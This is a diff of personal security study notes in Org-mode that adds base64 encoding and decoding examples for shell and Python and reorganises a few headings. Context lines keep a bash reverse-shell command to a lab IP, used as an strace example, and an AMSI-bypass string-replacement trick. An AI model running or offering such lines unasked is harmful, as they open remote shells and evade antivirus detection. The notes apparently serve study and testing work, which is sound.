@@ -348,6 +348,13 @@
     + ~strace -f~ //follow child processes created, syscall: fork
       - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
 
+*** base64 encoding decoding
+    + ~echo -n 'cat' | base64 -w 0~ //echo without trailing \n, base64 encoding without auto wrapping
+    + ~echo -n 'Y2F0' | base64 -d~ //decode, -i ignore garbage for more tolerance
+
+** TODO bash scripting
+   + man bash
+
 ** TODO powershell scripting
    + ~(Get-Host).version~
    + ~Get-Help(help)~
@@ -471,10 +478,6 @@
      + $not_evil = "amsiNOTEVIL" -replace "NOTEVIL", "context"
 
 **** TODO use encoding? 
-
-** bash scripting
-   + man bash
-   + 
 
 * Book4_Chapter 01 An Introduction to TCP/IP
   
@@ -831,6 +834,7 @@ relay the datagram.
 ** char, string processing
 
 *** encoding and decoding in python
+   [[ut#EncodeDecodeAFile.py]]
    + ~str("こ").encode("utf-8").decode("utf-8")~
    + ~str("こ").encode("shift-jis").decode("shift-jis")~
    + //Shift-JIS encoded string, in unsigned ints: ~130 177 130 241 130 201 130 191 130 205~ //こんにちは
@@ -838,6 +842,15 @@ relay the datagram.
    + ~hex(130) + hex(177) + hex(130) + hex(241)~ //"0x820xb10x820xf1"
    + ~b2 = b"\x82\xb1\x82\xf1"~ //b2.__class__ = <bytes>
    + ~(b2.decode("shift-jis")~ //"こん"
+
+**** base64 encoding decoding in python
+     #+begin_src
+     import base64
+     o1 = base64.b64encode(b'cat') # b'Y2F0'
+     o2 = base64.b64decode(o1) # b'cat'
+     #+end_src
+
+**** deprecated: codecs
    + ~codecs.encode(bytes('こんにちは', 'shift-jis'), encoding="base64")~ //b'grGC8YLJgr+CzQ==\n'
    + ~codecs.decode(b'grGC8YLJgr+CzQ==\n', encoding="base64")~ //b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd'
    + ~codecs.decode(b'\x82\xb1\x82\xf1\x82\xc9\x82\xbf\x82\xcd', encoding="shift-jis")~ //こんにちは
